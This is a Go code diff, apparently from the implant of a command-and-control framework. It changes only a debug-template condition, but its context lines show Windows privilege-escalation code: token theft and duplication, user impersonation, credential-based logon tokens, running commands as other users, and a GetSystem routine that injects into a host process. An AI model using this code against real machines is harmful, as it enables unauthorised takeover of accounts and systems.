@@ -21,7 +21,7 @@ package priv
 */
 
 import (
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 
 	"log"
 
@@ -60,7 +60,7 @@ func SePrivEnable(s string) error {
 	var luid windows.LUID
 	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(s), &luid)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("LookupPrivilegeValueW failed", err)
 		// {{end}}
 		return err
@@ -71,7 +71,7 @@ func SePrivEnable(s string) error {
 	privs.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
 	err = windows.AdjustTokenPrivileges(tokenHandle, false, &privs, 0, nil, nil)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("AdjustTokenPrivileges failed", err)
 		// {{end}}
 		return err
@@ -87,7 +87,7 @@ func RevertToSelf() error {
 func getPrimaryToken(pid uint32) (*windows.Token, error) {
 	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("OpenProcess failed")
 		// {{end}}
 		return nil, err
@@ -95,7 +95,7 @@ func getPrimaryToken(pid uint32) (*windows.Token, error) {
 	defer windows.CloseHandle(handle)
 	var token windows.Token
 	if err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY, &token); err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("OpenProcessToken failed")
 		// {{end}}
 		return nil, err
@@ -106,7 +106,7 @@ func getPrimaryToken(pid uint32) (*windows.Token, error) {
 func enableCurrentThreadPrivilege(privilegeName string) error {
 	ct, err := windows.GetCurrentThread()
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("GetCurrentThread failed", err)
 		// {{end}}
 		return err
@@ -114,7 +114,7 @@ func enableCurrentThreadPrivilege(privilegeName string) error {
 	var t windows.Token
 	err = windows.OpenThreadToken(ct, windows.TOKEN_QUERY|windows.TOKEN_ADJUST_PRIVILEGES, true, &t)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("openThreadToken failed", err)
 		// {{end}}
 		return err
@@ -129,7 +129,7 @@ func enableCurrentThreadPrivilege(privilegeName string) error {
 	}
 	err = windows.LookupPrivilegeValue(nil, privStr, &tp.Privileges[0].Luid)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("lookupPrivilegeValue failed")
 		// {{end}}
 		return err
@@ -145,7 +145,7 @@ func impersonateProcess(pid uint32) (newToken windows.Token, err error) {
 	primaryToken, err := getPrimaryToken(pid)
 
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("getPrimaryToken failed:", err)
 		// {{end}}
 		return
@@ -154,14 +154,14 @@ func impersonateProcess(pid uint32) (newToken windows.Token, err error) {
 
 	err = syscalls.ImpersonateLoggedOnUser(*primaryToken)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("impersonateLoggedOnUser failed:", err)
 		// {{end}}
 		return
 	}
 	err = windows.DuplicateTokenEx(*primaryToken, windows.TOKEN_ALL_ACCESS, &attr, windows.SecurityDelegation, windows.TokenPrimary, &newToken)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("duplicateTokenEx failed:", err)
 		// {{end}}
 		return
@@ -169,7 +169,7 @@ func impersonateProcess(pid uint32) (newToken windows.Token, err error) {
 	for _, priv := range requiredPrivileges {
 		err = enableCurrentThreadPrivilege(priv)
 		if err != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Println("Failed to set priv", priv)
 			// {{end}}
 			return
@@ -190,11 +190,11 @@ func impersonateUser(username string) (token windows.Token, err error) {
 	for _, proc := range p {
 		if proc.Owner() == username {
 			token, err = impersonateProcess(uint32(proc.Pid()))
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[%d] %s\n", proc.Pid(), proc.Executable())
 			// {{end}}
 			if err == nil {
-				// {{if .Debug}}
+				// {{if .Config.Debug}}
 				log.Println("Got token for process", proc.Pid(), proc.Executable())
 				// {{end}}
 				return
@@ -225,14 +225,14 @@ func MakeToken(domain string, username string, password string) error {
 	}
 	err = syscalls.LogonUser(pu, pd, pp, syscalls.LOGON32_LOGON_NEW_CREDENTIALS, syscalls.LOGON32_PROVIDER_DEFAULT, &token)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("LogonUser failed: %v\n", err)
 		// {{end}}
 		return err
 	}
 	err = syscalls.ImpersonateLoggedOnUser(token)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("impersonateLoggedOnUser failed:", err)
 		// {{end}}
 		return err
@@ -264,7 +264,7 @@ func deleteRegistryKey(keyPath, keyName string) (err error) {
 func RunProcessAsUser(username, command, args string) (out string, err error) {
 	token, err := impersonateUser(username)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("Could not impersonate user", username)
 		// {{end}}
 		return
@@ -273,12 +273,12 @@ func RunProcessAsUser(username, command, args string) (out string, err error) {
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token: syscall.Token(token),
 	}
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Starting %s as %s\n", command, username)
 	// {{end}}
 	output, err := cmd.Output()
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Println("Command failed:", err)
 		// {{end}}
 		return
@@ -293,7 +293,7 @@ func RunProcessAsUser(username, command, args string) (out string, err error) {
 func Impersonate(username string) (token windows.Token, err error) {
 	token, err = impersonateUser(username)
 	if err != nil {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Println("impersonateUser failed:", err)
 		//{{end}}
 		return
@@ -311,14 +311,14 @@ func GetSystem(data []byte, hostingProcess string) (err error) {
 		if p.Executable() == hostingProcess {
 			err = SePrivEnable("SeDebugPrivilege")
 			if err != nil {
-				// {{if .Debug}}
+				// {{if .Config.Debug}}
 				log.Println("SePrivEnable failed:", err)
 				// {{end}}
 				return
 			}
 			err = taskrunner.RemoteTask(p.Pid(), data, false)
 			if err != nil {
-				// {{if .Debug}}
+				// {{if .Config.Debug}}
 				log.Println("RemoteTask failed:", err)
 				// {{end}}
 				return
